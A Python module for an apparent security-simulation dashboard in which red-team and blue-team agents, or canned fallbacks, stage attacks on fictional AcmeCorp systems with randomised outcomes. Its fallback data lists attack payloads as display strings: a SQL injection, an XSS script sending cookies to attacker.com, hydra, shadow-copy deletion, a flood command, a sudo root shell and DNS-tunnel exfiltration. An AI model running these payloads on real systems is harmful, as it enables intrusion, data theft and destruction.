"""
Autonomous Red Team — runs attacks in the background without analyst intervention.
Falls back to realistic simulated attacks if Gemini API key is invalid/missing.
"""
from __future__ import annotations
import asyncio, random, logging, time, uuid
from backend.models.schemas import (
    AttackType, AttackStatus, DefenseStatus,
    AttackResult, DefenseResult,
)

logger = logging.getLogger("red_team")

ALL_ATTACKS = list(AttackType)

TARGETS = [
    "AcmeCorp CRM Portal",
    "AcmeCorp Finance Dashboard",
    "AcmeCorp Employee Login Page",
    "AcmeCorp Customer Database",
    "AcmeCorp Admin Panel",
    "AcmeCorp API Gateway",
    "AcmeCorp VPN Gateway",
    "AcmeCorp Email Server",
]

# Realistic fallback strategies per attack type (used when Gemini API unavailable)
FALLBACK_STRATEGIES: dict[AttackType, dict] = {
    AttackType.SQL_INJECTION: {
        "strategy": "Union-based SQL injection targeting the login endpoint. Crafting payloads to extract user credentials from the users table by exploiting unsanitized input fields.",
        "payload": "' UNION SELECT null,username,password FROM users WHERE '1'='1",
        "expected_impact": "Unauthorized database access, credential theft, potential full system compromise.",
    },
    AttackType.XSS: {
        "strategy": "Stored XSS attack injecting malicious JavaScript into user profile fields. Payload executes in victim browsers to steal session cookies and redirect to attacker-controlled page.",
        "payload": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
        "expected_impact": "Session hijacking, cookie theft, account takeover for all users viewing the injected content.",
    },
    AttackType.BRUTE_FORCE: {
        "strategy": "Distributed password spraying attack targeting admin accounts. Using top-1000 password list with 1 attempt per account per minute to evade lockout policies.",
        "payload": "hydra -L users.txt -P top1000.txt -t 4 ssh://target -o results.txt",
        "expected_impact": "Unauthorized access to admin accounts, lateral movement, privilege escalation.",
    },
    AttackType.PHISHING: {
        "strategy": "Spearphishing campaign impersonating IT helpdesk. Crafted emails with urgency triggers directing targets to cloned VPN login page to harvest credentials.",
        "payload": "Subject: URGENT: VPN Certificate Expiry - Action Required\nBody: Click here to renew: https://vpn-corp-secure.com/renew",
        "expected_impact": "Credential harvesting for VPN and corporate SSO, enabling network access and lateral movement.",
    },
    AttackType.RANSOMWARE: {
        "strategy": "Ransomware simulation targeting critical file shares. AES-256 encryption of /data/critical/* with RSA-2048 key exchange. Shadow copies deleted to prevent recovery.",
        "payload": "vssadmin delete shadows /all /quiet && cipher /e /s:C:\\data\\critical",
        "expected_impact": "Complete data unavailability, business disruption, estimated recovery time 72+ hours without clean backups.",
    },
    AttackType.DDOS: {
        "strategy": "HTTP flood targeting the /api/search endpoint with 50,000 requests/second from distributed botnet. Application-layer attack designed to exhaust server thread pool.",
        "payload": "hping3 -S --flood -V -p 443 target.com --rand-source",
        "expected_impact": "Service unavailability, legitimate user lockout, potential infrastructure cost spike from auto-scaling.",
    },
    AttackType.PRIVILEGE_ESCALATION: {
        "strategy": "SUID binary exploitation to escalate from www-data to root. Identified misconfigured sudo permissions allowing unrestricted command execution.",
        "payload": "find / -perm -4000 2>/dev/null | xargs ls -la; sudo -l; sudo /bin/bash",
        "expected_impact": "Full root access, ability to install backdoors, access all data, modify system configurations.",
    },
    AttackType.DATA_EXFILTRATION: {
        "strategy": "DNS tunneling exfiltration of customer database dump. Data encoded in DNS query subdomains to bypass DLP and egress filtering controls.",
        "payload": "iodine -f -P password dns.attacker.com && cat /var/db/customers.sql | base64 | split -b 63 - chunk && for f in chunk*; do dig $f.attacker.com; done",
        "expected_impact": "Loss of 50,000+ customer records, GDPR violation, regulatory fines, severe reputation damage.",
    },
}

FALLBACK_DEFENSES: dict[AttackType, dict] = {
    AttackType.SQL_INJECTION: {
        "analysis": "SQL injection detected via SIEM correlation. HTTP 500 errors with SQL keywords in request body. UNION SELECT pattern matched WAF rule REQUEST-942-APPLICATION-ATTACK-SQLI. Source IP flagged in threat intel feed.",
        "mitigation": "WAF rule deployed blocking UNION SELECT patterns. Source IP 192.168.1.50 blocked at perimeter. Parameterized queries enforced on /api/login. Database audit logging enabled.",
        "confidence": 94,
    },
    AttackType.XSS: {
        "analysis": "Stored XSS payload detected in user profile field. Script tag with external fetch identified. Content Security Policy violation logged. Payload would execute for all users viewing the profile.",
        "mitigation": "Malicious profile content sanitized and removed. CSP header updated to block inline scripts. Output encoding enforced on all user-generated content. Affected users notified to change passwords.",
        "confidence": 91,
    },
    AttackType.BRUTE_FORCE: {
        "analysis": "Brute force attack detected: 847 failed login attempts in 5 minutes from 12 distributed IPs. Password spraying pattern identified — 1 attempt per account. Targeting admin and service accounts.",
        "mitigation": "Account lockout triggered after 5 failures. All 12 source IPs blocked at firewall. CAPTCHA enabled on login form. MFA enforcement activated for all admin accounts. Rate limiting: 3 attempts/minute.",
        "confidence": 97,
    },
    AttackType.PHISHING: {
        "analysis": "Phishing campaign detected via email gateway. 23 employees received spoofed IT helpdesk emails. Domain vpn-corp-secure.com identified as typosquatting. 3 users clicked the link before blocking.",
        "mitigation": "Malicious domain blocked at DNS level. Phishing emails quarantined from all mailboxes. Affected users' passwords reset and sessions invalidated. Security awareness alert sent to all staff.",
        "confidence": 88,
    },
    AttackType.RANSOMWARE: {
        "analysis": "Ransomware activity detected via EDR: mass file rename events, shadow copy deletion commands, and unusual encryption patterns. Affected: 3 file servers. Isolated before network propagation.",
        "mitigation": "Affected systems isolated from network. Clean backups initiated for restoration. Incident response team engaged. Malware sample collected for forensic analysis. Recovery ETA: 4 hours.",
        "confidence": 96,
    },
    AttackType.DDOS: {
        "analysis": "DDoS attack detected: 48,000 req/sec targeting /api/search. HTTP flood from 2,400 distributed IPs. Application layer attack exhausting thread pool. Service degradation detected at T+2min.",
        "mitigation": "Traffic scrubbing activated via Cloudflare. Rate limiting: 100 req/min per IP. Challenge page deployed for suspicious traffic. BGP blackholing for top 50 attacking subnets. Service restored.",
        "confidence": 99,
    },
    AttackType.PRIVILEGE_ESCALATION: {
        "analysis": "Privilege escalation detected: sudo command executed outside business hours by www-data user. SUID binary /usr/bin/find exploited. Root shell spawned at 02:34 UTC. Lateral movement to 2 additional hosts.",
        "mitigation": "Compromised accounts disabled. SUID permissions audited and corrected. Sudo rules hardened per CIS benchmark. Affected hosts reimaged. Kernel patched to latest version. PAM rules updated.",
        "confidence": 89,
    },
    AttackType.DATA_EXFILTRATION: {
        "analysis": "Data exfiltration detected via DNS monitoring: high-entropy subdomain queries to dns.attacker.com. 2.3GB of encoded data exfiltrated over 45 minutes. Customer database dump identified as source.",
        "mitigation": "DNS tunneling blocked at resolver level. Attacker C2 domain sinkholed. Egress filtering updated to block unusual DNS query patterns. Affected data classified and breach notification initiated.",
        "confidence": 85,
    },
}

# Agent name mapping per attack type
ATTACK_AGENT_NAMES = {
    AttackType.SQL_INJECTION:        ("Exploit-Dev",      "Sentinel-AI"),
    AttackType.XSS:                  ("Exploit-Dev",      "Guardian-Firewall"),
    AttackType.BRUTE_FORCE:          ("Crypto-Breaker",   "Guardian-Firewall"),
    AttackType.PHISHING:             ("Social-Engineer",  "Forensic-Bot"),
    AttackType.RANSOMWARE:           ("Exploit-Dev",      "Forensic-Bot"),
    AttackType.DDOS:                 ("Crypto-Breaker",   "Guardian-Firewall"),
    AttackType.PRIVILEGE_ESCALATION: ("Exploit-Dev",      "Patch-Master"),
    AttackType.DATA_EXFILTRATION:    ("Crypto-Breaker",   "Sentinel-AI"),
}

# Injected from main.py
_attacks_store:  list = []
_defenses_store: list = []
_broadcast_fn = None


def init_autonomous(attacks_store, defenses_store, broadcast_fn):
    global _attacks_store, _defenses_store, _broadcast_fn
    _attacks_store  = attacks_store
    _defenses_store = defenses_store
    _broadcast_fn   = broadcast_fn


async def _try_gemini_attack(attack_type: AttackType, target: str, agent_name: str) -> AttackResult:
    """Try real Gemini attack, fall back to simulation if API fails."""
    try:
        from backend.agents.registry import ATTACK_AGENT_MAP
        agent = ATTACK_AGENT_MAP[attack_type]
        return await agent.execute_attack(attack_type, target)
    except Exception as e:
        err_msg = str(e).lower()
        if "429" in err_msg or "rate" in err_msg or "quota" in err_msg:
            logger.warning(f"⚠️ Gemini rate limit hit, using simulation for {attack_type.value}")
        else:
            logger.warning(f"Gemini unavailable ({e.__class__.__name__}), using simulation for {attack_type.value}")
        fb = FALLBACK_STRATEGIES[attack_type]
        return AttackResult(
            id=f"attack-{uuid.uuid4().hex[:8]}",
            type=attack_type,
            agent_id=f"r-sim",
            agent_name=agent_name,
            timestamp=time.time(),
            target=target,
            strategy=fb["strategy"],
            payload=fb["payload"],
            expected_impact=fb["expected_impact"],
            status=AttackStatus.INITIATED,
            rag_sources_used=[],
            logs=[f"[{time.strftime('%H:%M:%S')}] {agent_name} initiated {attack_type.value} on {target}"],
        )


async def _try_gemini_defense(attack: AttackResult, defense_agent_name: str) -> DefenseResult:
    """Try real Gemini defense, fall back to simulation if API fails."""
    try:
        from backend.agents.registry import DEFENSE_AGENT_MAP
        agent = DEFENSE_AGENT_MAP[attack.type]
        return await agent.analyze_and_defend(attack)
    except Exception as e:
        err_msg = str(e).lower()
        if "429" in err_msg or "rate" in err_msg or "quota" in err_msg:
            logger.warning(f"⚠️ Gemini rate limit hit, using simulation for defense")
        else:
            logger.warning(f"Gemini unavailable ({e.__class__.__name__}), using simulation for defense")
        fb = FALLBACK_DEFENSES[attack.type]
        return DefenseResult(
            id=f"defense-{uuid.uuid4().hex[:8]}",
            attack_id=attack.id,
            agent_id="b-sim",
            agent_name=defense_agent_name,
            timestamp=time.time(),
            analysis=fb["analysis"],
            mitigation=fb["mitigation"],
            confidence=fb["confidence"],
            status=DefenseStatus.ANALYZING,
            rag_sources_used=[],
            cve_references=[],
            mitre_references=[],
        )


async def run_autonomous_red_team():
    """Background task — Red Team agents attack every 15-45 seconds."""
    logger.info("🔴 Autonomous Red Team started")
    await asyncio.sleep(5)  # short initial delay

    while True:
        try:
            attack_type = random.choice(ALL_ATTACKS)
            target      = random.choice(TARGETS)
            red_name, blue_name = ATTACK_AGENT_NAMES[attack_type]

            logger.info(f"🔴 {red_name} launching {attack_type.value} on {target}")

            # Execute attack (real Gemini or fallback simulation)
            attack = await _try_gemini_attack(attack_type, target, red_name)
            _attacks_store.append(attack)

            if _broadcast_fn:
                await _broadcast_fn("attack_initiated", attack.model_dump())

            # Progress: INITIATED → IN_PROGRESS
            await asyncio.sleep(3)
            attack.status = AttackStatus.IN_PROGRESS
            attack.logs.append(f"[{time.strftime('%H:%M:%S')}] Status → IN_PROGRESS")
            if _broadcast_fn:
                await _broadcast_fn("attack_updated", attack.model_dump())

            # Progress: IN_PROGRESS → DETECTED
            await asyncio.sleep(3)
            attack.status = AttackStatus.DETECTED
            attack.logs.append(f"[{time.strftime('%H:%M:%S')}] Status → DETECTED by {blue_name}")
            if _broadcast_fn:
                await _broadcast_fn("attack_updated", attack.model_dump())

            # Trigger automated Blue Team defense
            asyncio.create_task(_auto_defend(attack, blue_name))

        except Exception as e:
            logger.error(f"Red Team loop error: {e}")

        # Wait 60-120 seconds between attacks (respects free tier: 15 req/min)
        await asyncio.sleep(random.randint(60, 120))


async def _auto_defend(attack: AttackResult, defense_agent_name: str):
    """Blue Team automatically responds to every detected attack."""
    if _broadcast_fn:
        await _broadcast_fn("defense_started", {
            "attack_id": attack.id,
            "agent": defense_agent_name,
        })

    try:
        defense = await _try_gemini_defense(attack, defense_agent_name)
        _defenses_store.append(defense)

        if _broadcast_fn:
            await _broadcast_fn("defense_analyzing", defense.model_dump())

        await asyncio.sleep(2)
        defense.status = DefenseStatus.MITIGATING
        if _broadcast_fn:
            await _broadcast_fn("defense_updated", defense.model_dump())

        await asyncio.sleep(2)
        # 85% block rate
        success = random.random() > 0.15
        defense.status = DefenseStatus.BLOCKED if success else DefenseStatus.FAILED
        attack.status  = AttackStatus.BLOCKED  if success else AttackStatus.SUCCESS

        if _broadcast_fn:
            await _broadcast_fn("defense_completed", defense.model_dump())
            await _broadcast_fn("attack_updated",    attack.model_dump())

        logger.info(f"🔵 {defense_agent_name}: {attack.type.value} → {'BLOCKED' if success else 'FAILED'}")

    except Exception as e:
        logger.error(f"Defense error: {e}")
